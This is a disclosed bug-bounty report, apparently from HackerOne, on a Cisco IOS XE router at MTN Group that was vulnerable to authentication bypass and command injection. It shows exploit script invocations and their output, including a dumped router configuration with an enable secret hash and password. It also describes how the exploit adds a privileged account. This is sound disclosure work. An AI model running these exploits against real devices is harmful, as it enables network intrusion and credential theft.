---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/mobile
  - os/ios
  - vuln/command-injection
  - vuln/authentication-bypass
  - trigger/low-priv-user
  - fix/patch-upstream
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2025-02-19
submitted: 2024-10-12T02:28:27.657Z
bounty_usd: null
votes: 48
cve: "CVE-2023-20198", "CVE-2023-20273"
program: "[[programs/mtn_group|MTN Group]]"
reporter: "odaysec"
source: "https://hackerone.com/reports/2778350"
title: "Cisco IOS XE instance at ████ vulnerable to CVE-██████"
---
# Cisco IOS XE instance at ████ vulnerable to CVE-██████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 48 | **Program:** MTN Group | **Disclosed:** 2025-02-19

- Report: [https://hackerone.com/reports/2778350](https://hackerone.com/reports/2778350)
- CWE: Command Injection - Generic | CVE: CVE-2023-20198, CVE-2023-20273
- Submitted: 2024-10-12T02:28:27.657Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
CVE-███████ is characterized by improper path validation to bypass Nginx filtering to reach the webui_wsma_http web endpoint without requiring authentication. By bypassing authentication to the endpoint, an attacker can execute arbitrary Cisco IOS commands or issue configuration changes with Privilege 15 privileges. Further attacks involved exploitation of CVE-2023-20273 to escalate to the underlying Linux OS root user to facilitate implantation.

This PoC exploits CVE-█████████ to leverage two different XML SOAP endpoints:
The vulnerability check, config, and command execution options all target the `cisco:wsma-exec` SOAP endpoint to insert commands into the `execCLI` element tag.
The add user option targets the `cisco:wsma-config` SOAP endpoint to issue a configuration change and add the Privilege 15 account. This endpoint could be [ab]used to make other configuration changes, but thats outside the scope of this PoC.

## Proof On Concepts :
See below for an example request that bypasses authentication on vulnerable instances of IOS-XE. This POC creates a user named baduser with privilege level 15. Let’s dig into the details.
{F3672631}

  1. Sign in as any user ███ query
  1. Visit Searchbar and Search Query ██████████: "MTN Innovation Centre"`
  1. Found domain owned by MTN Cameroon as `███`
  1. Intercept url to burp-suite and sent to repeater
  1. Sent to intruder and Set up the [exploits here](█████████)
  1. Run exploits bellow command 

```bash
exploit.py -t ████ -c

Testing for vulnerability
Target IP:      █████
Target URL:     █████████
Vulnerable:     True
IOS Ver:        ISR4331/K9 europ-constantia-2 IOS 16.6 Cisco IOS Software [Everest], ISR Software (X86_64_LINUX_IOSD-UNIVERSALK9-M), Version 16.6.4, RELEASE SOFTWARE (fc3)

Done.
```
```bash
exploit.py -t █████ -g

Selected Target:        ██████
Running in Exec Mode
Executing Command:      sh run

Sending exploit to target URL:  █████

Building configuration...
Current configuration : 17326 bytes
```
```bash
enable secret 5 $1$vF3Q$wplcifyib3DUyzbgcUGe/1
enable password 7 1214041E1E
snmp-server trap-source GigabitEthernet0/0/0.3029
snmp-server source-interface informs GigabitEthernet0/0/0.3029
snmp-server contact ████ ██████
```
and you can see all the sensitive for configuration was exposed

{F3672637}

{F3672640}

{F3672642}


## Supporting Material/References:
  * [Cisco Advisory](███████)
  * [horizon3ai CVE-██████ research](██████████)
  * [horizon3ai CVE-██████ PoC](██████)
  * [LeakIX CVE-2023-20273 PoC](██████████)

## Impact

Cisco is providing an update for the ongoing investigation into observed exploitation of the web UI feature in Cisco IOS XE Software. We are updating the list of fixed releases and adding the Software Checker. Our investigation has determined that the actors exploited two previously unknown issues. The attacker first exploited CVE-█████ to gain initial access and issued a privilege 15 command to create a local user and password combination. This allowed the user to log in with normal user access. The attacker then exploited another component of the web UI feature, leveraging the new local user to elevate privilege to root and write the implant to the file system.

## Timeline

- **Report Filed**
- **2024-10-18** @h1_analyst_dhaval: Hi ██████,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
█████
- **Report Title Updated**
- **Report Severity Updated**
- **Report Pending Program Review**
- **2024-11-18** @odaysec: **Hi!** Good Morning @mtn_group @slydingdong1

I reviewed the vulnerability steps on the server `sub*mtnbusiness.net` today and noticed that the issue has been resolved. could we mark this report as **resolved**?
- **2025-01-11** @odaysec: I reviewed the vulnerability steps on this reports today and noticed that the issue has been resolved. could we mark this report as **resolved**?
- **2025-01-13** @odaysec: **Hi!** Good Morning @mtn_group @slydingdong1 
I reviewed the vulnerability steps on this reports today and noticed that the vulnerabilities has been `patched`. could we mark this report as **resolved**?
- **Report Resolved**
- **Agreed On Going Public**
- **2025-01-22** @odaysec: Good Morning can request `disclosed`for learning purposes. I hope this writeup's I think this is a good report to study and use as course.
- **2025-02-03** @odaysec: hi team @slydingdong1 there any update for `disclosed-report` for learning purposes. I hope this writeup's I think this is a good report to learn.
- **Report Became Public**
